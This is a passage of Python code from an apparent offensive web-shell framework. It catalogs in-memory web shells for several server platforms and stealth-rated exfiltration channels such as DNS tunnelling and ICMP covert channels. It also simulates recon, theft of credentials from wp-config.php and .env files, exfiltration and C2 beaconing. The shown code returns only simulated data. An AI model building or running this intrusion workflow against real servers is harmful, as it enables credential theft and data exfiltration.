                "name": "ASP/VBScript Shell",
                "description": "Classic ASP memory shell for legacy IIS",
                "features": ["Memory execution", "WScript automation", "Registry access"]
            },
            {
                "type": "aspx",
                "name": "ASPX/.NET Shell",
                "description": ".NET memory shell with dynamic compilation",
                "features": ["In-memory compilation", "Reflection", "Full .NET access"]
            },
            {
                "type": "jsp",
                "name": "JSP Java Shell",
                "description": "Java memory shell with Nashorn/GraalJS",
                "features": ["Script engine execution", "Cross-platform", "JVM access"]
            },
            {
                "type": "python",
                "name": "Python Shell",
                "description": "Python memory shell for Flask/Django",
                "features": ["exec() based", "subprocess", "OS integration"]
            },
            {
                "type": "node",
                "name": "Node.js Shell",
                "description": "Node.js memory shell with VM isolation",
                "features": ["vm.runInContext", "child_process", "async support"]
            }
        ]
    
    def get_exfil_methods(self) -> List[Dict]:
        """Get exfiltration methods"""
        return [
            {
                "method": "http_chunked",
                "name": "HTTP Chunked",
                "description": "Chunked HTTP POST with encryption",
                "stealth": "medium"
            },
            {
                "method": "dns_tunnel",
                "name": "DNS Tunnel",
                "description": "Data exfil via DNS queries",
                "stealth": "high"
            },
            {
                "method": "websocket",
                "name": "WebSocket",
                "description": "Real-time WebSocket exfil",
                "stealth": "medium"
            },
            {
                "method": "icmp_covert",
                "name": "ICMP Covert",
                "description": "ICMP echo request tunneling",
                "stealth": "high"
            },
            {
                "method": "steganography",
                "name": "Steganography",
                "description": "Hide data in images",
                "stealth": "very_high"
            }
        ]
    
    def simulate_shell_execution(
        self,
        shell_id: str,
        action: str,
        params: Dict = None
    ) -> Dict[str, Any]:
        """Simulate shell execution (safe mode)"""
        
        if shell_id not in self.shells:
            return {"error": "Shell not found"}
        
        shell = self.shells[shell_id]
        
        # Simulation results
        simulations = {
            "exec": {
                "action": "exec",
                "command": params.get("cmd", "whoami") if params else "whoami",
                "result": {
                    "stdout": "www-data",
                    "simulated": True
                }
            },
            "recon": {
                "action": "recon",
                "result": {
                    "hostname": "webserver01",
                    "ip": "192.168.1.50",
                    "user": "www-data",
                    "os": "Linux 5.4.0",
                    "netstat_sample": "tcp 0.0.0.0:80 LISTEN\ntcp 0.0.0.0:443 LISTEN",
                    "simulated": True
                }
            },
            "harvest": {
                "action": "harvest",
                "result": {
                    "credentials_found": 3,
                    "sources": ["wp-config.php", ".env", "environment"],
                    "types": ["mysql", "api_key"],
                    "simulated": True
                }
            },
            "exfil": {
                "action": "exfil",
                "result": {
                    "chunks_sent": 5,
                    "total_size": 20480,
                    "method": shell["config"]["exfil_method"],
                    "encrypted": True,
                    "simulated": True
                }
            },
            "upgrade": {
                "action": "upgrade",
                "result": {
                    "status": "beacon_ready",
                    "beacon_id": secrets.token_hex(6),
                    "callback": shell["config"]["callback"],
                    "simulated": True
                }
            }
        }
        
        return simulations.get(action, {"error": "Unknown action"})
    
    def get_stats(self) -> Dict[str, Any]:
        """Get enhancer statistics"""
        return {
            "total_shells": len(self.shells),
            "active_sessions": len(self.active_sessions),
            "shell_types": {
                st.value: sum(1 for s in self.shells.values() if s["config"]["type"] == st.value)
                for st in WebShellType
            },
            "memory_only_count": sum(1 for s in self.shells.values() if s["config"]["memory_only"]),
            "auto_upgrade_count": sum(1 for s in self.shells.values() if s["config"]["auto_upgrade"])
        }


# Singleton instance
_enhancer = None

def get_enhancer() -> WebShellEnhancer:
    """Get or create enhancer instance"""
    global _enhancer
    if _enhancer is None:
        _enhancer = WebShellEnhancer()
    return _enhancer
